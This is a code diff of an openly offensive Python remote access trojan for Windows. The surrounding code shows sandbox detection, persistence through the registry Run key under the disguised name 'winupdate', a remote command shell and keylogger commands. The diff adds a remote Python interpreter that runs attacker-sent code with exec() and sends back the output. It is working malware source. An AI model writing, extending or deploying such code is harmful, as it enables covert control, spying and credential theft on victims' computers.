@@ -2,6 +2,7 @@ import socket, os, sys, platform, time, ctypes, subprocess, sqlite3, pyscreeze, 
 import win32api, winerror, win32event, win32crypt
 from shutil import copyfile
 from winreg import *
+from io import StringIO
 
 strHost = "127.0.0.1"
 # strHost = socket.gethostbyname("")
@@ -41,7 +42,7 @@ def meltFile():
 
 def detectSandboxie():
     try:
-        libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")
+        ctypes.windll.LoadLibrary("SbieDll.dll")
 
         return " (Sandboxie) "
     except: return ""
@@ -61,7 +62,7 @@ def startup(onstartup):
         if not os.getcwd() == APPDATA:
             copyfile(strPath, strAppPath)
 
-        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
+        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
         SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath)
         CloseKey(objRegKey)
     except WindowsError:
@@ -74,12 +75,12 @@ def startup(onstartup):
 
 def remove_from_startup():
     try:
-        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
+        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
         DeleteValue(objRegKey, "winupdate")
         CloseKey(objRegKey)
     except FileNotFoundError:
         send(str.encode("Program is not registered in startup."))
-    except WindowsError as e:
+    except WindowsError:
         send(str.encode("Error removing value!"))
     else:
         send(str.encode("success"))
@@ -270,6 +271,31 @@ def command_shell():
         time.sleep(0.1)
         send(bytData)  # send output
 
+def python_interpreter():
+    send(b'received')
+    while 1:
+        command = recv(intBuff).decode()
+        if command == 'exit':
+            send(b'exiting')
+            break
+        old_stdout = sys.stdout
+        redirected_output = sys.stdout = StringIO()
+        try:
+            exec(command)
+            print('')
+            error = None
+        except Exception as e:
+            error = f"{e.__class__.__name__}: "
+            try:
+                error += f"{e.args[0]}"
+            except:
+                pass
+        finally:
+            sys.stdout = old_stdout
+        if error:
+            send(error.encode())
+        else:
+            send(redirected_output.getvalue().encode())
 
 def vbs_block_process(process, popup, message, title, timeout, type):
     # VBScript to block process, this allows the script to disconnect from the original python process, check github rep for source
@@ -393,6 +419,8 @@ while True:
                 continue
             elif strData == "cmd":
                 command_shell()
+            elif strData == "python":
+                python_interpreter()
             elif strData == "keystart":
                 keylogger("start")
             elif strData == "keystop":
